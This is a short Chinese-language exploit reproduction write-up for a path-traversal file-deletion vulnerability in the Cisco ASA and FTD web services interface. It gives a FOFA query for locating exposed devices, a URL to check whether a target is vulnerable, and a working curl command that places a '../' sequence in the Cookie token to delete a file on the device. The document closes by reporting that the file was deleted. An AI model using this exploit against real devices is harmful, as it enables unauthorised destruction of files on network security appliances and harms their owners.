# CISCO ASA设备任意文件删除漏洞

## 漏洞描述

Cisco ASA Software和FTD Software中的Web服务接口存在路径遍历漏洞，该漏洞源于程序没有对HTTP URL进行正确的输入验证。远程攻击者可通过发送带有目录遍历序列的特制HTTP请求利用该漏洞读取并删除系统上的敏感信息。

## 漏洞影响

> Cisco ASA设备、Cisco FTD设备

## FOFA

> /+CSCOE+/&&Cisco-ASA

## 漏洞复现

访问

```
http://xxx.xxx.xxx.xxx/+CSCOE+/session_password.html 
```

 存在则可能出现此漏洞

![cisco-6](_v_images/CISCO-ASA/cisco-6.png)

例如我们删除一张图片

```
http://xxx.xxx.xxx.xxx/+CSCOU+/csco_logo.gif
```

![cisco-7](_v_images/CISCO-ASA/cisco-7.png)

使用 curl 发送请求

```shell
curl -H "Cookie: token=../+CSCOU+/csco_logo.gif" https://xxx.xxx.xxx.xxx/+CSCOE+/session_password.html
```

![cisco-8](_v_images/CISCO-ASA/cisco-8.png)

成功删除图标